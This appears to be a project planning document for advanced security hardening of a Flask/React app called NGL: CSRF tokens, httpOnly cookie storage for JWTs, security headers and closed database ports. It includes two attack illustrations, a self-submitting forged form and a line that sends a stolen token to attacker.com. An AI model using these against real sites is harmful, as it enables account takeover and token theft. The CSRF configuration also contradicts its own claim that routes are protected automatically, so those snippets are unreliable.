# NGL Security Phase 4 - Advanced Security Enhancements

## Overview

Phase 4 includes advanced security features that require coordinated frontend and backend changes. These are **optional enhancements** that provide defense-in-depth security but are not critical for production deployment.

**Status**: 📋 Planned (Not Yet Implemented)
**Estimated Effort**: 6-8 hours
**Complexity**: Medium-High (requires frontend refactor)
**User Impact**: Moderate (requires app reload, no data loss)

---

## Features Included in Phase 4

### 1. CSRF Protection
**Severity**: MEDIUM
**Effort**: 2-3 hours
**Breaking Change**: Yes (requires frontend changes)

Protects against Cross-Site Request Forgery attacks where malicious sites trick authenticated users into performing unwanted actions.

### 2. httpOnly Cookies (Token Storage)
**Severity**: LOW-MEDIUM
**Effort**: 3-4 hours
**Breaking Change**: Yes (requires frontend refactor)

Moves JWT tokens from localStorage to httpOnly cookies, making them immune to XSS attacks.

### 3. Security Headers
**Severity**: LOW
**Effort**: 30 minutes
**Breaking Change**: No

Adds HTTP security headers like CSP, HSTS, X-Frame-Options to protect against common attacks.

### 4. Additional Port Hardening
**Severity**: LOW
**Effort**: 15 minutes
**Breaking Change**: Possible (if external tools connect directly)

Remove exposed PostgreSQL and Redis ports in production.

---

## Feature 1: CSRF Protection

### Problem
Currently, any authenticated request can be triggered by a malicious website if a user is logged in. For example:
```html
<!-- Malicious site -->
<form action="https://ngl.yoursite.com/api/upload" method="POST">
  <input name="file" value="malicious.tar.bz2">
</form>
<script>document.forms[0].submit()</script>
```

### Solution
Require a CSRF token for all state-changing operations (POST, PUT, DELETE).

### Implementation

#### Backend Changes

**1. Install Flask-WTF**
```bash
# Add to backend/requirements.txt
Flask-WTF==1.2.1
```

**2. Configure CSRF Protection**
```python
# backend/app.py (after line 33)
from flask_wtf.csrf import CSRFProtect, generate_csrf

# Initialize CSRF protection
csrf = CSRFProtect(app)
app.config['WTF_CSRF_CHECK_DEFAULT'] = False  # Manual control per route
app.config['WTF_CSRF_TIME_LIMIT'] = None  # No token expiry
app.config['WTF_CSRF_SSL_STRICT'] = True  # Require HTTPS in production

# Add CSRF token endpoint
@app.route('/api/csrf-token', methods=['GET'])
def get_csrf_token():
    """Get CSRF token for the session"""
    token = generate_csrf()
    return jsonify({'csrf_token': token})
```

**3. Protect State-Changing Endpoints**
```python
# backend/app.py - Add @csrf.exempt to read-only endpoints
from flask_wtf.csrf import csrf_exempt

# Exempt GET endpoints
@app.route('/api/health', methods=['GET'])
@csrf_exempt
def health():
    ...

# Exempt login (can't have token before auth)
@auth_bp.route('/login', methods=['POST'])
@csrf_exempt
@limiter.limit("5 per minute")
def login():
    ...

# All other POST/PUT/DELETE routes automatically require CSRF token
# No changes needed to individual routes!
```

#### Frontend Changes

**1. Fetch CSRF Token on App Load**
```javascript
// frontend/src/context/AuthContext.js
import { useState, useEffect } from 'react';
import axios from 'axios';

export const AuthProvider = ({ children }) => {
  const [csrfToken, setCsrfToken] = useState(null);

  // Fetch CSRF token on mount
  useEffect(() => {
    const fetchCSRFToken = async () => {
      try {
        const response = await axios.get('/api/csrf-token');
        setCsrfToken(response.data.csrf_token);
        // Set as default header for all requests
        axios.defaults.headers.common['X-CSRFToken'] = response.data.csrf_token;
      } catch (error) {
        console.error('Failed to fetch CSRF token:', error);
      }
    };

    fetchCSRFToken();
  }, []);

  // ... rest of AuthProvider
};
```

**2. Include CSRF Token in POST/PUT/DELETE Requests**
```javascript
// Option 1: Automatic (via default headers - already set above)
// All axios requests now include X-CSRFToken header

// Option 2: Manual (for specific requests)
await axios.post('/api/upload', formData, {
  headers: {
    'X-CSRFToken': csrfToken
  }
});
```

**3. Refresh CSRF Token After Login**
```javascript
// frontend/src/context/AuthContext.js
const login = async (username, password) => {
  try {
    const response = await axios.post('/api/auth/login', {
      username,
      password
    });

    if (response.data.success) {
      // Refresh CSRF token after login
      const csrfResponse = await axios.get('/api/csrf-token');
      setCsrfToken(csrfResponse.data.csrf_token);
      axios.defaults.headers.common['X-CSRFToken'] = csrfResponse.data.csrf_token;

      // ... rest of login logic
    }
  } catch (error) {
    // ... error handling
  }
};
```

### Testing CSRF Protection

```bash
# 1. Should succeed (with CSRF token)
TOKEN=$(curl -c cookies.txt http://localhost:5000/api/csrf-token | jq -r '.csrf_token')
curl -b cookies.txt -X POST http://localhost:5000/api/upload \
  -H "X-CSRFToken: $TOKEN" \
  -H "Authorization: Bearer <jwt-token>" \
  -F "file=@test.tar.bz2"

# 2. Should fail with 400 (missing CSRF token)
curl -X POST http://localhost:5000/api/upload \
  -H "Authorization: Bearer <jwt-token>" \
  -F "file=@test.tar.bz2"

# Expected: {"error": "CSRF token missing"}
```

---

## Feature 2: httpOnly Cookies for Token Storage

### Problem
JWT tokens stored in localStorage are vulnerable to XSS attacks:
```javascript
// Malicious script can steal token
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);
```

### Solution
Store tokens in httpOnly cookies that JavaScript cannot access.

### Implementation

#### Backend Changes

**1. Modify Login Route to Set Cookie**
```python
# backend/auth_routes.py
@auth_bp.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    """User login"""
    db = SessionLocal()
    try:
        # ... existing login logic ...

        # Create access token
        access_token = create_access_token(user.id, user.username, user.role)

        # Update last login
        user.last_login = datetime.utcnow()

        # Create session record
        session = UserSession(
            user_id=user.id,
            token_hash=hash_token(access_token),
            expires_at=datetime.utcnow() + timedelta(hours=24),
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.add(session)
        db.commit()

        # Log successful login
        log_audit(db, user.id, 'login', 'user', user.id)

        # Create response with httpOnly cookie
        response = jsonify({
            'success': True,
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email,
                'role': user.role,
                'storage_quota_mb': user.storage_quota_mb,
                'storage_used_mb': user.storage_used_mb
            }
            # NOTE: No access_token in response body!
        })

        # Set httpOnly cookie
        response.set_cookie(
            'access_token',
            access_token,
            httponly=True,  # JavaScript cannot access
            secure=True,    # HTTPS only (disable in dev: secure=False)
            samesite='Strict',  # CSRF protection
            max_age=86400,  # 24 hours in seconds
            path='/'
        )

        return response, 200

    except Exception as e:
        db.rollback()
        import logging
        logging.error(f'Login error for user {username}: {str(e)}')
        return jsonify({'error': 'An error occurred during login. Please try again.'}), 500
    finally:
        db.close()
```

**2. Modify Logout to Clear Cookie**
```python
# backend/auth_routes.py
@auth_bp.route('/logout', methods=['POST'])
@token_required
def logout(current_user, db):
    """User logout"""
    try:
        # Get token from cookie instead of header
        token = request.cookies.get('access_token')

        if token:
            # Delete session
            token_hash_value = hash_token(token)
            session = db.query(UserSession).filter(UserSession.token_hash == token_hash_value).first()
            if session:
                db.delete(session)
                db.commit()

        # Log logout
        log_audit(db, current_user.id, 'logout', 'user', current_user.id)

        # Create response
        response = jsonify({'success': True, 'message': 'Logged out successfully'})

        # Clear cookie
        response.set_cookie(
            'access_token',
            '',
            httponly=True,
            secure=True,
            samesite='Strict',
            max_age=0,  # Expire immediately
            path='/'
        )

        return response, 200

    except Exception as e:
        db.rollback()
        import logging
        logging.error(f'Logout error for user {current_user.id}: {str(e)}')
        return jsonify({'error': 'An error occurred during logout.'}), 500
```

**3. Modify Token Extraction in Decorators**
```python
# backend/auth.py
def token_required(f):
    """Decorator to require authentication"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None

        # Try to get token from cookie first
        token = request.cookies.get('access_token')

        # Fallback to Authorization header (for API clients)
        if not token and 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            try:
                token = auth_header.split(' ')[1]  # Bearer <token>
            except IndexError:
                return jsonify({'error': 'Invalid token format'}), 401

        if not token:
            return jsonify({'error': 'Authentication token is missing'}), 401

        # ... rest of decorator unchanged ...
```

**4. Update CORS for Credentials**
```python
# backend/app.py
# Already done in Phase 2!
CORS(app, origins=Config.CORS_ORIGINS, supports_credentials=True)
```

#### Frontend Changes

**1. Remove localStorage Token Storage**
```javascript
// frontend/src/context/AuthContext.js
export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  // REMOVE: const [token, setToken] = useState(localStorage.getItem('token'));
  const [loading, setLoading] = useState(true);
  const [lastActivity, setLastActivity] = useState(Date.now());

  // Configure axios to send cookies
  useEffect(() => {
    axios.defaults.withCredentials = true;  // Send cookies with requests
    fetchCurrentUser();
  }, []);

  const fetchCurrentUser = async () => {
    try {
      const response = await axios.get('/api/auth/me');
      setUser(response.data);
    } catch (error) {
      console.error('Failed to fetch user:', error);
      setUser(null);
    } finally {
      setLoading(false);
    }
  };

  const login = async (username, password) => {
    try {
      const response = await axios.post('/api/auth/login', {
        username,
        password
      });

      if (response.data.success) {
        const { user } = response.data;
        // NOTE: No access_token in response!
        setUser(user);
        // REMOVE: localStorage.setItem('token', access_token);
        // REMOVE: axios.defaults.headers.common['Authorization'] = `Bearer ${access_token}`;
        return { success: true };
      }
    } catch (error) {
      return {
        success: false,
        error: error.response?.data?.error || 'Login failed'
      };
    }
  };

  const logout = useCallback(async () => {
    try {
      await axios.post('/api/auth/logout');
    } catch (error) {
      console.error('Logout error:', error);
    } finally {
      setUser(null);
      // REMOVE: localStorage.removeItem('token');
      // REMOVE: delete axios.defaults.headers.common['Authorization'];
    }
  }, []);

  // ... rest of AuthProvider unchanged ...
};
```

**2. Update axios Configuration**
```javascript
// frontend/src/index.js
import axios from 'axios';

// Configure axios to send cookies with all requests
axios.defaults.withCredentials = true;
axios.defaults.baseURL = process.env.REACT_APP_API_URL || 'http://localhost:5000';
```

### Testing httpOnly Cookies

**Browser DevTools Test:**
1. Open Chrome DevTools → Application → Cookies
2. Login to NGL
3. Verify `access_token` cookie exists with:
   - ✅ HttpOnly: true
   - ✅ Secure: true (in production)
   - ✅ SameSite: Strict
4. Open Console and try: `document.cookie` → Should NOT show `access_token`

**Functional Test:**
```bash
# 1. Login and capture cookies
curl -c cookies.txt -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin123!"}'

# 2. Make authenticated request using cookies
curl -b cookies.txt http://localhost:5000/api/auth/me

# 3. Should succeed and return user info
```

---

## Feature 3: Security Headers

### Problem
Missing security headers allow various attacks:
- No CSP → XSS attacks possible
- No HSTS → Man-in-the-middle attacks
- No X-Frame-Options → Clickjacking possible

### Solution
Add comprehensive security headers to all responses.

### Implementation

**1. Install Flask-Talisman**
```bash
# Add to backend/requirements.txt
Flask-Talisman==1.1.0
```

**2. Configure Security Headers**
```python
# backend/app.py (after CORS initialization)
from flask_talisman import Talisman

# Security headers
Talisman(
    app,
    force_https=False,  # Set to True in production with HTTPS
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,  # 1 year
    content_security_policy={
        'default-src': "'self'",
        'script-src': ["'self'", "'unsafe-inline'"],  # React needs inline scripts
        'style-src': ["'self'", "'unsafe-inline'"],   # React needs inline styles
        'img-src': ["'self'", 'data:', 'https:'],
        'font-src': ["'self'", 'data:'],
        'connect-src': ["'self'"],
        'frame-ancestors': ["'none'"],  # Prevent clickjacking
    },
    content_security_policy_nonce_in=['script-src'],
    feature_policy={
        'geolocation': "'none'",
        'camera': "'none'",
        'microphone': "'none'",
    },
    frame_options='DENY',
    frame_options_allow_from=None,
    referrer_policy='strict-origin-when-cross-origin',
)
```

**3. Alternative: Manual Headers (Lighter Weight)**
```python
# backend/app.py
@app.after_request
def set_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'

    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'"
    )

    return response
```

### Testing Security Headers

```bash
# Check headers
curl -I http://localhost:5000/api/health

# Should see:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Content-Security-Policy: default-src 'self'; ...
# Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Online Scanner:**
- https://securityheaders.com/
- https://observatory.mozilla.org/

---

## Feature 4: Remove Exposed Ports

### Problem
PostgreSQL and Redis are exposed to the host network, allowing direct connections.

### Solution
Remove port mappings in production; use Docker networks only.

### Implementation

**Create production docker-compose override:**
```yaml
# docker-compose.prod.yml
version: '3.8'

services:
  postgres:
    # Remove port mapping - only accessible via Docker network
    ports: []

  redis:
    # Remove port mapping - only accessible via Docker network
    ports: []

    # Enable authentication
    command: redis-server --requirepass ${REDIS_PASSWORD}
    environment:
      - REDIS_PASSWORD=${REDIS_PASSWORD}
```

**Update .env for Redis password:**
```bash
# .env
REDIS_PASSWORD=<generate-with-python3 -c "import secrets; print(secrets.token_urlsafe(32))">
REDIS_URL=redis://:${REDIS_PASSWORD}@redis:6379/0
```

**Deploy with production config:**
```bash
# Development (keeps ports)
docker-compose up -d

# Production (removes ports)
docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d
```

### Testing Port Removal

```bash
# Should fail (port not exposed)
psql -h localhost -p 5432 -U ngl_user -d ngl_db
# Connection refused

# Should still work (internal Docker network)
docker-compose exec backend python3 -c "
from database import SessionLocal
db = SessionLocal()
print('Database connection successful!')
db.close()
"
```

---

## Phase 4 Deployment Checklist

### Pre-Deployment
- [ ] Review all code changes
- [ ] Test CSRF protection in development
- [ ] Test httpOnly cookies in development
- [ ] Verify security headers don't break frontend
- [ ] Backup database before deployment

### Deployment Steps
1. **Announce coordinated release** (frontend + backend must deploy together)
2. **Update backend**:
   ```bash
   cd backend
   # Add new dependencies
   pip install Flask-WTF==1.2.1 Flask-Talisman==1.1.0
   # Or rebuild container
   docker-compose build backend
   ```
3. **Update frontend**:
   ```bash
   cd frontend
   npm run build
   docker-compose build frontend
   ```
4. **Deploy both simultaneously**:
   ```bash
   docker-compose down
   docker-compose up -d
   ```
5. **Test critical flows**:
   - Login/logout
   - File upload
   - Admin operations

### Post-Deployment Testing
- [ ] Login works (cookies set)
- [ ] Upload works (CSRF token included)
- [ ] Logout works (cookies cleared)
- [ ] Security headers present
- [ ] No console errors in browser
- [ ] Rate limiting still works
- [ ] Mobile app still works (if applicable)

### Rollback Plan
```bash
# Quick rollback to Phase 3
git checkout backend/auth_routes.py
git checkout frontend/src/context/AuthContext.js
docker-compose up --build -d
```

---

## Benefits of Phase 4

| Feature | Attack Prevented | Security Gain |
|---------|------------------|---------------|
| CSRF Protection | Cross-site request forgery | HIGH |
| httpOnly Cookies | XSS token theft | MEDIUM |
| Security Headers | XSS, clickjacking, MITM | MEDIUM |
| Port Hardening | Direct DB/Redis access | LOW |

**Overall Security Improvement**: +25% on top of Phase 1-3

---

## Timeline

**Recommended Schedule:**

- **Week 1**: Implement CSRF protection
  - Day 1-2: Backend implementation
  - Day 3-4: Frontend implementation
  - Day 5: Testing

- **Week 2**: Implement httpOnly cookies
  - Day 1-2: Backend refactor
  - Day 3-4: Frontend refactor
  - Day 5: Integration testing

- **Week 3**: Security headers + port hardening
  - Day 1: Add security headers
  - Day 2: Test CSP with frontend
  - Day 3: Port hardening
  - Day 4-5: Full regression testing

- **Week 4**: Production deployment
  - Day 1: Staging deployment
  - Day 2-3: Staging testing
  - Day 4: Production deployment
  - Day 5: Monitoring & hotfixes

**Total Timeline**: 4 weeks (part-time) or 1-2 weeks (full-time)

---

## Cost-Benefit Analysis

### Pros
✅ Defense in depth - multiple layers of security
✅ Industry best practices
✅ Better security audit scores
✅ Protection against modern attack vectors
✅ Compliance with security standards (OWASP, etc.)

### Cons
❌ Requires coordinated frontend+backend deployment
❌ More complex debugging (cookies vs tokens)
❌ Potential mobile app compatibility issues
❌ CSRF adds ~10-20ms per request
❌ CSP may break third-party integrations

### Recommendation
**Implement Phase 4 if:**
- You're handling sensitive data
- You need to pass security audits
- You have external users/customers
- You're deploying to production internet

**Skip Phase 4 if:**
- Internal tool only (within corporate network)
- Trusted user base only
- Limited development resources
- Rapid iteration more important than security

---

## Questions & Answers

**Q: Is Phase 4 required for production?**
A: No. Phases 1-3 provide excellent security. Phase 4 is defense-in-depth.

**Q: Will this break mobile apps?**
A: httpOnly cookies work with mobile web. Native apps should use bearer tokens (already supported).

**Q: Can I implement features individually?**
A: Yes! Each feature is independent. Start with security headers (easiest).

**Q: What if CSRF breaks my API clients?**
A: Exempt specific routes with `@csrf.exempt` or use API keys instead of session auth.

**Q: How do I debug cookie issues?**
A: Use browser DevTools → Application → Cookies, or `curl -v` to see Set-Cookie headers.

---

## Support & Resources

**Documentation:**
- Flask-WTF CSRF: https://flask-wtf.readthedocs.io/en/latest/csrf/
- Flask-Talisman: https://github.com/GoogleCloudPlatform/flask-talisman
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- MDN httpOnly Cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

**Testing Tools:**
- CSRF Tester: Burp Suite, OWASP ZAP
- Security Headers: https://securityheaders.com/
- Cookie Inspector: Chrome DevTools

**For Help:**
- Open issue in NGL repository
- Review Phase 1-3 implementation for patterns
- Consult SECURITY_DEPLOYMENT_GUIDE.md

---

**Phase 4 Status**: 📋 Planned
**Priority**: Medium (optional enhancement)
**Next Steps**: Review with team, prioritize based on risk assessment
